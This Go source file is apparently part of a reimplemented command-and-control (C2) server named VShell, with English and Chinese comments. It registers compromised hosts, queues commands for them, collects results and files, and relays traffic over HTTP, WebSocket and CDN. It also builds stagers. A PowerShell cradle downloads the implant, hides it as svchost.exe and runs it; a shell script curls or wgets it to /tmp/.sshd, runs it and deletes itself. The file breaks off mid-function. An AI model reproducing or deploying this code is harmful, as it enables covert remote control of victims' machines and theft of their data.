package c2engine

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/binary"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"math/big"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// ============================================================================
// C2 Listener - HTTP/HTTPS/DNS/WebSocket listener management
// C2 监听器——HTTP/HTTPS/DNS/WebSocket 监听器管理
// ============================================================================
// C2Listener manages a single C2 protocol listener.
type C2Listener struct {
	mu        sync.RWMutex
	ID        int64
	Config    *Listener
	server    *http.Server
	listener  net.Listener
	tlsCert   *tls.Certificate
	isRunning bool
	stopCh    chan struct{}
	mux       *http.ServeMux

	// Session tracking
	sessions map[string]*AgentSession
}
// AgentSession tracks an active agent connection.
type AgentSession struct {
	SessionID   string    `json:"session_id"`
	ClientID    int64     `json:"client_id"`
	ListenerID  int64     `json:"listener_id"`
	RemoteAddr  string    `json:"remote_addr"`
	ConnectedAt time.Time `json:"connected_at"`
	LastSeen    time.Time `json:"last_seen"`
}
// NewC2Listener creates a new C2 listener from configuration.
func NewC2Listener(config *Listener) *C2Listener {
	return &C2Listener{
		ID:       config.ID,
		Config:   config,
		sessions: make(map[string]*AgentSession),
		stopCh:   make(chan struct{}),
	}
}
// GetSessions returns immutable snapshots of active agent sessions for this listener.
func (cl *C2Listener) GetSessions() []*AgentSession {
	cl.mu.RLock()
	defer cl.mu.RUnlock()

	result := make([]*AgentSession, 0, len(cl.sessions))
	for _, session := range cl.sessions {
		if session == nil {
			continue
		}
		snapshot := *session
		result = append(result, &snapshot)
	}
	return result
}
// Start begins listening for C2 connections.
func (cl *C2Listener) Start() error {
	cl.mu.Lock()

	if cl.isRunning {
		cl.mu.Unlock()
		return fmt.Errorf("listener %d already running", cl.ID)
	}

	mux := http.NewServeMux()
	cl.mux = mux

	// Register C2 protocol handlers based on mode
	switch cl.Config.Mode {
	case ListenerModeHTTP:
		cl.registerHTTPHandlers(mux)
	case ListenerModeHTTPS:
		cl.registerHTTPSHandlers(mux)
	case ListenerModeWebSocket:
		cl.registerWSHandlers(mux)
	case ListenerModeCDNWebSocket:
		cl.registerCDNWSHandlers(mux)
	case ListenerModeDNS:
		cl.registerDNSHandlers(mux)
	default:
		cl.registerHTTPHandlers(mux)
	}

	addr := cl.Config.ListenAddr
	if addr == "" {
		addr = "0.0.0.0:443"
	}

	cl.server = &http.Server{
		Addr:         addr,
		Handler:      mux,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  120 * time.Second,
	}

	if cl.Config.Mode == ListenerModeHTTPS {
		cert, err := cl.loadOrGenerateTLS()
		if err != nil {
			cl.mu.Unlock()
			return fmt.Errorf("TLS setup failed: %w", err)
		}
		cl.server.TLSConfig = &tls.Config{
			Certificates: []tls.Certificate{*cert},
			MinVersion:   tls.VersionTLS12,
		}
	}

	// The goroutine takes ownership of the lock from this function.
	// After setting isRunning=true it releases the lock, allowing
	// other readers to proceed. When the server stops it re-acquires
	// the lock to update isRunning=false. Because the goroutine
	// handles release, Start() does NOT use defer Unlock.
	go func() {
		cl.isRunning = true
		cl.mu.Unlock()

		var err error
		if cl.Config.Mode == ListenerModeHTTPS {
			ln, e := net.Listen("tcp", addr)
			if e != nil {
				log.Printf("[C2Listener %d] Failed to bind: %v", cl.ID, e)
				cl.mu.Lock()
				cl.isRunning = false
				cl.mu.Unlock()
				return
			}
			cl.listener = tls.NewListener(ln, cl.server.TLSConfig)
			err = cl.server.Serve(cl.listener)
		} else {
			err = cl.server.ListenAndServe()
		}

		cl.mu.Lock()

		if err != nil && err != http.ErrServerClosed {
			log.Printf("[C2Listener %d] Server error: %v", cl.ID, err)
		}
		cl.isRunning = false
		cl.mu.Unlock()
	}()

	// Wait briefly for the goroutine to update isRunning
	time.Sleep(50 * time.Millisecond)
	cl.mu.RLock()
	running := cl.isRunning
	cl.mu.RUnlock()

	log.Printf("[C2Listener %d] Started %s listener on %s", cl.ID, cl.Config.Mode, addr)
	if !running {
		return fmt.Errorf("listener failed to start")
	}
	return nil
}
// Stop gracefully stops the C2 listener.
func (cl *C2Listener) Stop() error {
	cl.mu.Lock()
	defer cl.mu.Unlock()

	if !cl.isRunning {
		return nil
	}

	close(cl.stopCh)
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	if err := cl.server.Shutdown(ctx); err != nil {
		return err
	}

	cl.isRunning = false
	log.Printf("[C2Listener %d] Stopped", cl.ID)
	return nil
}
// IsRunning returns whether the listener is active.
func (cl *C2Listener) IsRunning() bool {
	cl.mu.RLock()
	defer cl.mu.RUnlock()
	return cl.isRunning
}

// ============================================================================
// HTTP C2 handlers
// ============================================================================

func (cl *C2Listener) registerHTTPHandlers(mux *http.ServeMux) {
	// C2 protocol endpoints
	mux.HandleFunc("/api/checkin", cl.handleCheckin)
	mux.HandleFunc("/api/tasks", cl.handleGetTasks)
	mux.HandleFunc("/api/result", cl.handlePostResult)
	mux.HandleFunc("/api/upload", cl.handleUpload)
	mux.HandleFunc("/api/download", cl.handleDownload)

	// Agent binary delivery endpoints
	mux.HandleFunc("/swt", cl.handleAgentStage)      // TCP staged agent
	mux.HandleFunc("/sww", cl.handleAgentStageless)  // WebSocket full agent
	mux.HandleFunc("/swk", cl.handleAgentKCP)        // KCP agent
	mux.HandleFunc("/sws", cl.handleAgentShellcode)  // Shellcode
	mux.HandleFunc("/swd", cl.handleAgentDLL)        // DLL agent
	mux.HandleFunc("/swl", cl.handleAgentLinux)      // Linux agent
	mux.HandleFunc("/swld", cl.handleAgentListenDLL) // Listener DLL

	// Health check
	mux.HandleFunc("/health", cl.handleHealth)
}

func (cl *C2Listener) registerHTTPSHandlers(mux *http.ServeMux) {
	cl.registerHTTPHandlers(mux)
}

func (cl *C2Listener) registerWSHandlers(mux *http.ServeMux) {
	cl.registerHTTPHandlers(mux)
	mux.HandleFunc("/ws", cl.handleWebSocket)
}

func (cl *C2Listener) registerCDNWSHandlers(mux *http.ServeMux) {
	// CDN WebSocket mode: agents connect through CDN edge → origin
	// Register both HTTP endpoints (for agent delivery) and WS endpoint
	cl.registerHTTPHandlers(mux)
	// Main WebSocket endpoint for CDN-proxied agent connections
	mux.HandleFunc("/ws", cl.handleWebSocket)
	// CDN-specific WebSocket path
	mux.HandleFunc("/cdn/ws", cl.handleCDNWebSocket)
}

func (cl *C2Listener) registerDNSHandlers(mux *http.ServeMux) {
	// DNS mode uses a custom DNS server, but also exposes HTTP endpoints
	cl.registerHTTPHandlers(mux)
}

// ============================================================================
// Agent check-in handler
// ============================================================================

func (cl *C2Listener) handleCheckin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	var req CheckinRequest
	if err := json.Unmarshal(body, &req); err != nil {
		// Fall back to the agent transport frame (AES-256-GCM,
		// <u32 LE len><[12B nonce][ct][16B tag]>) when the listener has a salt.
		// 帧密钥 = FrameSaltKey(EncryptSalt)；AEAD 参数系由捕获帧推断（见 protocol.go）。
		engine := GetEngine()
		listener := engine.GetListener(cl.ID)
		if listener != nil && listener.EncryptSalt != "" {
			pt, ferr := FrameDecrypt(body, listener.EncryptSalt)
			if ferr != nil || json.Unmarshal(pt, &req) != nil {
				http.Error(w, "Bad request", http.StatusBadRequest)
				return
			}
		} else {
			http.Error(w, "Bad request", http.StatusBadRequest)
			return
		}
	}

	// Verify the agent's key
	engine := GetEngine()
	listener := engine.GetListener(cl.ID)
	if listener != nil && listener.VerifyKey != "" {
		if req.VerifyKey != listener.VerifyKey {
			Logf("Listener %d: rejected agent with wrong verify key from %s", cl.ID, r.RemoteAddr)
			json.NewEncoder(w).Encode(CheckinResponse{
				Status:  "error",
				Message: "Invalid verify key",
			})
			return
		}
	}

	// Register or update client
	client, err := engine.NewClient(
		req.VerifyKey,
		"http",
		r.RemoteAddr,
		req.LocalIP,
		req.UserName,
		req.HostName,
		req.OsName,
		req.ProcessName,
		req.Arch,
	)
	if err != nil {
		http.Error(w, "Internal error", http.StatusInternalServerError)
		return
	}

	// Create session
	sessionID := GenerateSessionID(cl.ID)
	cl.mu.Lock()
	cl.sessions[sessionID] = &AgentSession{
		SessionID:   sessionID,
		ClientID:    client.ID,
		ListenerID:  cl.ID,
		RemoteAddr:  r.RemoteAddr,
		ConnectedAt: time.Now(),
		LastSeen:    time.Now(),
	}
	cl.mu.Unlock()

	Logf("Listener %d: agent %d checked in (%s@%s, %s)",
		cl.ID, client.ID, req.UserName, req.HostName, req.OsName)

	// Send response
	resp := CheckinResponse{
		Status:    "ok",
		ClientID:  client.ID,
		SessionID: sessionID,
		Interval:  listener.PingInterval,
		Timeout:   listener.DisconnectTimeout,
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

// ============================================================================
// Task polling handler
// ============================================================================

func (cl *C2Listener) handleGetTasks(w http.ResponseWriter, r *http.Request) {
	clientIDStr := r.URL.Query().Get("client_id")
	if clientIDStr == "" {
		http.Error(w, "Missing client_id", http.StatusBadRequest)
		return
	}

	var clientID int64
	fmt.Sscanf(clientIDStr, "%d", &clientID)

	// The verify key is the only credential on the task channel: a caller that
	// can reach the listener port must prove it knows the key, otherwise it
	// could read any agent's queued commands.
	engine := GetEngine()
	listener := engine.GetListener(cl.ID)
	if listener != nil && listener.VerifyKey != "" {
		if r.URL.Query().Get("verify_key") != listener.VerifyKey {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}
	}

	client := engine.GetClient(clientID)
	if client == nil {
		http.Error(w, "Client not found", http.StatusNotFound)
		return
	}

	// Update last seen
	client.UpdateSeen()

	// Get pending tasks (atomically marks them as dispatched)
	pendingTasks := engine.GetAndMarkPendingTasks(clientID)

	tasks := make([]TaskItem, 0, len(pendingTasks))
	for _, t := range pendingTasks {
		tasks = append(tasks, TaskItem{
			ID:      t.ID,
			Command: t.Command,
			Timeout: t.Timeout,
		})
	}

	if tasks == nil {
		tasks = []TaskItem{}
	}

	listener = engine.GetListener(cl.ID)
	interval := 5
	if listener != nil {
		interval = listener.PingInterval
	}

	resp := TaskResponse{
		Tasks:    tasks,
		Interval: interval,
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

// ============================================================================
// Result submission handler
// ============================================================================

func (cl *C2Listener) handlePostResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	var req ResultRequest
	var rawBody []byte
	if err := json.Unmarshal(body, &req); err != nil {
		// Agent transport frame fallback, same as check-in: the HTTP transport
		// GCM-wraps the result body.
		engine := GetEngine()
		listener := engine.GetListener(cl.ID)
		if listener == nil || listener.EncryptSalt == "" {
			http.Error(w, "Bad request", http.StatusBadRequest)
			return
		}
		pt, ferr := FrameDecrypt(body, listener.EncryptSalt)
		if ferr != nil {
			http.Error(w, "Bad request", http.StatusBadRequest)
			return
		}
		rawBody = pt
		// 帧内载荷有两种形态：
		//   1. 早期复刻端的 ResultRequest JSON —— 当前唯一有生产者的形态
		//      （agent/transport_real.go 的 SendResult）
		//   2. 结果记录块 —— 严格增量的容错路径，当前无生产者，形态为
		//      复刻端定义的契约而非原版事实（见下方记录块一节）
		// 只有两者都不是才拒绝；此处不早退，交由下面的分支判定。
		if json.Unmarshal(pt, &req) != nil {
			req = ResultRequest{}
		}
	}

	// 记录块判定：JSON 里没有 CommandID/Result，且帧内载荷通过记录块的形状校验
	// （见 DecodeAgentResultBlock：0x54 终止记录 + 长度自洽）。原版记录块不带
	// VerifyKey（凭据来自连接本身），因此不能拿 ResultRequest 的凭据规则去套它。
	recordBlock := req.CommandID == 0 && req.Result == "" && IsAgentResultBlock(rawBody)

	engine := GetEngine()

	if recordBlock {
		// 记录块路径：原版不在记录里回传 client id / task id / verify key
		// （命令记录由服务器侧的任务索引关联，见 FUN_0100dec0 /
		// FUN_0100dda0 把记录序号写回索引表），因此按「该监听器唯一活跃
		// 客户端」归属；无法唯一确定时记录日志并丢弃，不猜。
		clientID, ok := cl.singleResultClient()
		if !ok {
			Logf("Listener %d: record-block result from %s cannot be attributed to a unique client; dropped",
				cl.ID, r.RemoteAddr)
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(ResultResponse{Status: "ok", Received: false})
			return
		}
		text := DecodeAgentRecordText(rawBody)
		Logf("Listener %d: record-block result from client %d (%d records, %d text bytes)",
			cl.ID, clientID, len(ParseAgentRecordBlock(rawBody)), len(text))
		// 流式结果（terminal_output: / screen_frame:）按原样转发给面板查看者；
		// 其余文本无法定位到具体任务（记录里没有任务序号，见上面的说明），
		// 只记日志，不臆造任务归属。
		if text != "" && forwardStreamingResult(clientID, text) {
			Logf("Listener %d: streamed record result from client %d", cl.ID, clientID)
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(ResultResponse{Status: "ok", Received: true})
		return
	}

	// The verify key is the only credential on the result channel: without it,
	// any remote caller could forge results (including fake terminal/screen
	// streams) for any client.
	listener := engine.GetListener(cl.ID)
	if listener != nil && listener.VerifyKey != "" {
		if req.VerifyKey != listener.VerifyKey {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}
	}

	// Forward streaming results (terminal output / screen frames) to the
	// web-panel WebSocket viewers via the controller-registered hook. They are
	// live data, not terminal task records — don't store them as results.
	if forwardStreamingResult(req.ClientID, req.Result) {
		Logf("Listener %d: streamed result from client %d (cmd %d)", cl.ID, req.ClientID, req.CommandID)
	} else {
		if err := engine.UpdateTask(req.CommandID, req.Result, req.Status); err != nil {
			Logf("Listener %d: failed to update task %d: %v", cl.ID, req.CommandID, err)
		}
		Logf("Listener %d: task %d completed by client %d (%s)",
			cl.ID, req.CommandID, req.ClientID, req.Status)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(ResultResponse{
		Status:   "ok",
		Received: true,
	})
}

// ============================================================================
// Agent result record block (原版结果帧) — TOLERANCE PATH, currently no producer
// 结果记录块解析（容错路径，当前无生产者）
//
// 原版 agent 把任务结果写成 24 字节类型化记录序列（FUN_0100d160 的布局，
// 见 c2engine/wire.go 的 AgentField）。结果文本由 FUN_01094ba0 编成一条
// 0x75 记录（A=0, B=1, C=0）加一条 0x54 终止记录（A=1, B=1, C=0）；记录
// 本身不带 client id / task id —— 原版用记录序号在服务器侧的任务索引里查
// （FUN_0100dec0 / FUN_0100dda0 → cmd+0x50[index]）。
//
// 重要：**记录→线缆的形态未恢复**。没有任何函数把缓冲 +0x88/+0x90 取出来
// 写 socket（已排除项与已确证事实见 agent/main.go 的「Result frames on the
// wire」一节）。因此下面这套解析的输入形态（记录块之后内联负载、+0x10 写
// 负载长度）是**复刻端定义的契约，不是原版事实**；它当前也**没有生产者**
// —— agent 各传输仍发 ResultRequest JSON（agent/transport_real.go 的
// SendResult 记录了该偏差）。
//
// 保留它的唯一目的是「严格增量的容错」：服务器先按 JSON 解析，只有当载荷
// 通过下面的形状校验时才走记录块分支，因此即便将来出现说记录块的 agent，
// 这条路径能接住；在那之前它不会被触发。不要据此认为记录块已经在用。
// ============================================================================
// DecodeAgentResultBlock parses a result record block in the reimplementation's
// contract shape (see above — not a recovered original wire format).
//
// 形状：
//
//	[24B 负载记录][24B 0x54 终止记录(A=1,B=1,C=0)][负载字节]
//
// 校验点：终止记录的固定字段、块长恰为 48 + (+0x10 的长度)。两条同时成立
// 才认，避免把任意帧误判成记录块。
func DecodeAgentResultBlock(data []byte) (recs []AgentField, load []byte, ok bool) {
	if len(data) < 48 {
		return nil, nil, false
	}
	end := data[24:48]
	if end[0] != 0x54 ||
		binary.LittleEndian.Uint32(end[4:]) != 1 ||
		binary.LittleEndian.Uint32(end[8:]) != 1 ||
		binary.LittleEndian.Uint32(end[12:]) != 0 ||
		binary.LittleEndian.Uint64(end[16:]) != 0 {
		return nil, nil, false
	}
	n := int(binary.LittleEndian.Uint64(data[16:]))
	if n < 0 || 48+n != len(data) {
		return nil, nil, false
	}
	return ParseAgentRecordBlock(data[:48]), data[48:], true
}
// ParseAgentRecordBlock parses a block of 24-byte agent records.
func ParseAgentRecordBlock(data []byte) []AgentField {
	return ParseAgentFrame(data)
}
// DecodeAgentRecordText renders a result record block back into text.
//
// 0x75 是字符串结果记录（FUN_01094ba0），契约形态里负载即文本；其余记录
// 类型（如 FUN_01094a20 的 0x48 标量）不在这里翻译 —— 它们的服务器侧渲染
// 方式没有证据，不臆造。
func DecodeAgentRecordText(data []byte) string {
	recs, load, ok := DecodeAgentResultBlock(data)
	if !ok || len(recs) == 0 || recs[0].Kind != 0x75 {
		return ""
	}
	return string(load)
}
// IsAgentResultBlock reports whether a frame payload is a valid result block.
func IsAgentResultBlock(data []byte) bool {
	_, _, ok := DecodeAgentResultBlock(data)
	return ok
}
// singleResultClient returns the listener's only active client.
//
// 记录块不带 client id；只有当该监听器下恰有一个客户端时才能唯一归属，
// 否则返回 false（调用方丢弃并记日志，不猜）。会话表由签到写入，记录结果
// 必然发生在签到之后。
func (cl *C2Listener) singleResultClient() (int64, bool) {
	cl.mu.RLock()
	ids := make(map[int64]struct{}, len(cl.sessions))
	for _, s := range cl.sessions {
		if s != nil {
			ids[s.ClientID] = struct{}{}
		}
	}
	cl.mu.RUnlock()
	if len(ids) == 1 {
		for id := range ids {
			return id, true
		}
	}
	return 0, false
}

// ============================================================================
// Agent binary delivery handlers (DownloadController equivalents)
// ============================================================================

func (cl *C2Listener) handleAgentStage(w http.ResponseWriter, r *http.Request) {
	cl.serveAgentBinary(w, r, AgentTypeStage, PlatformWindows, ArchAMD64)
}

func (cl *C2Listener) handleAgentStageless(w http.ResponseWriter, r *http.Request) {
	cl.serveAgentBinary(w, r, AgentTypeStageless, PlatformWindows, ArchAMD64)
}

func (cl *C2Listener) handleAgentKCP(w http.ResponseWriter, r *http.Request) {
	cl.serveAgentBinary(w, r, AgentTypeStageless, PlatformWindows, ArchAMD64)
}

func (cl *C2Listener) handleAgentShellcode(w http.ResponseWriter, r *http.Request) {
	cl.serveAgentBinary(w, r, AgentTypeShellcode, PlatformWindows, ArchAMD64)
}

func (cl *C2Listener) handleAgentDLL(w http.ResponseWriter, r *http.Request) {
	cl.serveAgentBinary(w, r, AgentTypeDLL, PlatformWindows, ArchAMD64)
}

func (cl *C2Listener) handleAgentLinux(w http.ResponseWriter, r *http.Request) {
	cl.serveAgentBinary(w, r, AgentTypeStageless, PlatformLinux, ArchAMD64)
}

func (cl *C2Listener) handleAgentListenDLL(w http.ResponseWriter, r *http.Request) {
	cl.serveAgentBinary(w, r, AgentTypeListenDLL, PlatformWindows, ArchAMD64)
}

// serveAgentBinary delivers an agent binary to the requesting client
func (cl *C2Listener) serveAgentBinary(w http.ResponseWriter, r *http.Request, agentType, platform, arch string) {
	engine := GetEngine()
	listener := engine.GetListener(cl.ID)
	if listener == nil {
		http.Error(w, "Listener not found", 404)
		return
	}

	buildInfo := GetBuildInfo(platform, arch, agentType)

	// Try to load the pre-built agent binary
	agentData := cl.loadAgentBinary(buildInfo)
	if agentData == nil {
		// Generate a placeholder binary with embedded configuration
		agentData = cl.generateAgentBinary(buildInfo, listener)
	}

	// Set headers
	w.Header().Set("Content-Type", buildInfo.MimeType)
	w.Header().Set("Content-Disposition",
		fmt.Sprintf(`attachment; filename="agent_%s_%s%s"`,
			platform, arch, buildInfo.Extension))
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(agentData)))

	w.Write(agentData)

	Logf("Listener %d: served %s agent for %s/%s (%d bytes)",
		cl.ID, agentType, platform, arch, len(agentData))
}

func (cl *C2Listener) loadAgentBinary(info *AgentBuildInfo) []byte {
	// Attempt to load from agents directory
	filename := fmt.Sprintf("agents/agent_%s_%s%s", info.Platform, info.Arch, info.Extension)
	data, err := os.ReadFile(filename)
	if err != nil {
		return nil
	}
	return data
}

func (cl *C2Listener) generateAgentBinary(info *AgentBuildInfo, listener *Listener) []byte {
	connectAddr := listener.ConnectAddr
	if connectAddr == "" {
		connectAddr = listener.ListenAddr
	}

	// For Windows, generate a PE with the PowerShell stager
	if info.Platform == PlatformWindows {
		return generateWindowsStagerPE(connectAddr, listener.VerifyKey)
	}

	// For Linux/macOS, generate a shell script stager
	return generateUnixStager(connectAddr, listener.VerifyKey, info.Platform, info.Mode)
}

// generateWindowsStagerPE creates a valid PE with an embedded PowerShell download cradle
func generateWindowsStagerPE(server, key string) []byte {
	psScript := fmt.Sprintf(
		`$u='http://%s/swt';$f=$env:TEMP+'\svchost.exe';(New-Object Net.WebClient).DownloadFile($u,$f);Start-Process $f -WindowStyle Hidden`,
		server,
	)
	// Encode as UTF-16LE
	payload := make([]byte, len(psScript)*2+2)
	for i, c := range psScript {
		payload[i*2] = byte(c)
		payload[i*2+1] = 0
	}
	return MinimalPE(payload)
}

// generateUnixStager creates a shell script stager for Linux/macOS
func generateUnixStager(server, key, platform, mode string) []byte {
	path := "/swl"
	switch mode {
	case AgentTypeShellcode:
		path = "/sws"
	case AgentTypeDLL:
		path = "/swd"
	}
	return []byte(fmt.Sprintf(`#!/bin/sh
# VShell Agent - Unix Stager
# Platform: %s, Mode: %s
URL="http://%s%s"
TMP="${TMPDIR:-/tmp}/.sshd"
if command -v curl >/dev/null 2>&1; then
    curl -s -A "Mozilla/5.0" "$URL" -o "$TMP" && chmod +x "$TMP" && "$TMP" &
elif command -v wget >/dev/null 2>&1; then
    wget -q -U "Mozilla/5.0" "$URL" -O "$TMP" && chmod +x "$TMP" && "$TMP" &
fi
rm -f "$0"
`, platform, mode, server, path))
}

// ============================================================================
// Upload handler (agent → server file upload)
// ============================================================================

func (cl *C2Listener) handleUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	engine := GetEngine()

	// Parse multipart form (32MB max)
	if err := r.ParseMultipartForm(32 << 20); err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}

	clientIDStr := r.FormValue("client_id")
	var clientID int64
	fmt.Sscanf(clientIDStr, "%d", &clientID)

	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "File field required", http.StatusBadRequest)
		return
	}
	defer file.Close()

	// Save uploaded file
	uploadPath := fmt.Sprintf("uploads/%d/%s", clientID, header.Filename)
	os.MkdirAll(fmt.Sprintf("uploads/%d", clientID), 0755)
	dst, err := os.Create(uploadPath)
	if err != nil {
		http.Error(w, "Failed to save file", http.StatusInternalServerError)
		return
	}
	defer dst.Close()

	written, _ := io.Copy(dst, file)

	// Update client flow stats
	if client := engine.GetClient(clientID); client != nil {
		client.Flow.AddInlet(written)
	}

	Logf("Listener %d: uploaded %s (%d bytes) from client %d",
		cl.ID, header.Filename, written, clientID)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status": "ok",
		"path":   uploadPath,
		"size":   written,
	})
}

// ============================================================================
// Download handler (server → agent file download)
// ============================================================================

func (cl *C2Listener) handleDownload(w http.ResponseWriter, r *http.Request) {
	path := r.URL.Query().Get("path")
	if path == "" {
		http.Error(w, "Path required", http.StatusBadRequest)
		return
	}

	// Security: prevent path traversal
	if strings.Contains(path, "..") {
		http.Error(w, "Invalid path", http.StatusBadRequest)
		return
	}

	// Check if file exists
	info, err := os.Stat(path)
	if err != nil {
		http.Error(w, "File not found", http.StatusNotFound)
		return
	}

	// Serve file
	w.Header().Set("Content-Disposition",
		fmt.Sprintf(`attachment; filename="%s"`, path))
	http.ServeFile(w, r, path)

	Logf("Listener %d: served download %s (%d bytes)", cl.ID, path, info.Size())
}

// ============================================================================
// WebSocket handler (for terminal/screen streaming)
// ============================================================================

// WebSocket handler (for agent C2 transport over WebSocket)

// wsUpgrader handles HTTP → WebSocket upgrades for agent transport
var wsUpgrader = websocket.Upgrader{
	ReadBufferSize:  4096,
	WriteBufferSize: 4096,
	CheckOrigin: func(r *http.Request) bool {
		return true // Allow all origins for C2 agent connections
	},
}
// WSMessage represents a WebSocket protocol message.
type WSMessage struct {
	Type      string          `json:"type"` // checkin, poll, result, ping, task, pong, error
	ClientID  int64           `json:"client_id,omitempty"`
	SessionID string          `json:"session_id,omitempty"`
	CommandID int64           `json:"command_id,omitempty"`
	Data      json.RawMessage `json:"data,omitempty"` // payload varies by type
	Status    string          `json:"status,omitempty"`
	Message   string          `json:"message,omitempty"`
}

func (cl *C2Listener) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := wsUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[WS:%d] Upgrade failed: %v", cl.ID, err)
		return
	}
	defer conn.Close()

	remoteAddr := r.RemoteAddr
	log.Printf("[WS:%d] Agent connected via WebSocket from %s", cl.ID, remoteAddr)

	// Set read/write deadlines
	conn.SetReadDeadline(time.Now().Add(120 * time.Second))

	var clientID int64

	// Main WebSocket message loop
	for {
		var msg WSMessage
		if err := conn.ReadJSON(&msg); err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseNormalClosure) {
				log.Printf("[WS:%d] Connection error: %v", cl.ID, err)
			}
			break
		}

		// Reset read deadline on each message
		conn.SetReadDeadline(time.Now().Add(120 * time.Second))

		switch msg.Type {
		case "checkin":
			resp := cl.handleWSCheckin(&msg, remoteAddr)
			if resp != nil {
				clientID = resp.ClientID
				conn.WriteJSON(resp)
			}
		case "poll":
			if msg.ClientID > 0 {
				clientID = msg.ClientID
			}
			tasks := cl.handleWSPoll(clientID)
			conn.WriteJSON(tasks)
		case "result":
			resp := cl.handleWSResult(&msg)
			conn.WriteJSON(resp)
		case "ping":
			conn.WriteJSON(&WSMessage{
				Type:    "pong",
				Message: "alive",
			})
		default:
			conn.WriteJSON(&WSMessage{
				Type:    "error",
				Message: fmt.Sprintf("unknown message type: %s", msg.Type),
			})
		}
	}

	log.Printf("[WS:%d] Agent disconnected (client %d)", cl.ID, clientID)
}

// handleCDNWebSocket handles WebSocket connections forwarded from CDN edge nodes.
// CDN-proxied connections include CDN-specific headers (e.g., CF-Connecting-IP,
// X-Forwarded-For). The protocol is identical to the standard WebSocket handler
// but adds CDN header awareness for correct client IP extraction.
func (cl *C2Listener) handleCDNWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := wsUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[CDN-WS:%d] Upgrade failed: %v", cl.ID, err)
		return
	}
	defer conn.Close()

	// Extract real client IP from CDN headers
	remoteAddr := r.RemoteAddr
	if cfIP := r.Header.Get("CF-Connecting-IP"); cfIP != "" {
		remoteAddr = cfIP
	} else if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		remoteAddr = strings.SplitN(xff, ",", 2)[0]
	}

	// Verify CDN edge authentication if configured
	cdnSecret := r.Header.Get("X-CDN-Secret")
	if cl.Config.EncryptSalt != "" && cdnSecret != cl.Config.EncryptSalt {
		log.Printf("[CDN-WS:%d] CDN secret mismatch from %s", cl.ID, remoteAddr)
		conn.WriteJSON(&WSMessage{Type: "error", Message: "cdn auth failed"})
		return
	}

	log.Printf("[CDN-WS:%d] Agent connected via CDN from %s", cl.ID, remoteAddr)

	conn.SetReadDeadline(time.Now().Add(120 * time.Second))
	var clientID int64

	for {
		var msg WSMessage
		if err := conn.ReadJSON(&msg); err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseNormalClosure) {
				log.Printf("[CDN-WS:%d] Connection error: %v", cl.ID, err)
			}
			break
		}

		conn.SetReadDeadline(time.Now().Add(120 * time.Second))

		switch msg.Type {
		case "checkin":
			resp := cl.handleWSCheckin(&msg, remoteAddr)
			if resp != nil {
				clientID = resp.ClientID
				conn.WriteJSON(resp)
			}
		case "poll":
			if msg.ClientID > 0 {
				clientID = msg.ClientID
			}
			conn.WriteJSON(cl.handleWSPoll(clientID))
		case "result":
			conn.WriteJSON(cl.handleWSResult(&msg))
		case "ping":
			conn.WriteJSON(&WSMessage{Type: "pong", Message: "alive"})
		default:
			conn.WriteJSON(&WSMessage{Type: "error", Message: fmt.Sprintf("unknown type: %s", msg.Type)})
		}
	}

	log.Printf("[CDN-WS:%d] Agent disconnected (client %d)", cl.ID, clientID)
}

// handleWSCheckin processes a WebSocket agent check-in
func (cl *C2Listener) handleWSCheckin(msg *WSMessage, remoteAddr string) *WSMessage {
	engine := GetEngine()

	var checkin CheckinRequest
	if err := json.Unmarshal(msg.Data, &checkin); err != nil {
		return &WSMessage{
			Type:    "error",
			Message: fmt.Sprintf("invalid checkin data: %v", err),
		}
	}

	// Verify key if configured
	verifyKey := cl.Config.VerifyKey
	if verifyKey != "" && checkin.VerifyKey != verifyKey {
		log.Printf("[WS:%d] Verify key mismatch from %s", cl.ID, remoteAddr)
		return &WSMessage{
			Type:    "error",
			Message: "verify key mismatch",
		}
	}

	// Auto-register or update client
	client, err := engine.NewClient(
		checkin.VerifyKey,
		"websocket",
		remoteAddr,
		checkin.LocalIP,
		checkin.UserName,
		checkin.HostName,
		checkin.OsName,
		checkin.ProcessName,
		checkin.Arch,
	)
	if err != nil {
		log.Printf("[WS:%d] Failed to register client: %v", cl.ID, err)
		return &WSMessage{
			Type:    "error",
			Message: "registration failed",
		}
	}

	// Track session
